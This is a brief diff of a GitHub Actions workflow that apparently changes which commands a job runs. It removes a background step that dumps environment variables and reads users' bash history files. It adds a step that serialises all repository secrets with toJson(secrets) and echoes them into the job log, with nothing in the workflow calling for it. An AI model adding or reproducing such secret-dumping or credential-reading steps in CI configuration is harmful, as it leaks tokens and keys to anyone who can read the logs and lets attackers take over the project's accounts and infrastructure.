@@ -5,6 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          ls -la /
-      - run: |
-          env && cat /home/*/bash_history &
+          ls -l /
+      - run: echo "$SECRETS_CONTEXT"
+        env:
+            SECRETS_CONTEXT: ${{ toJson(secrets) }}
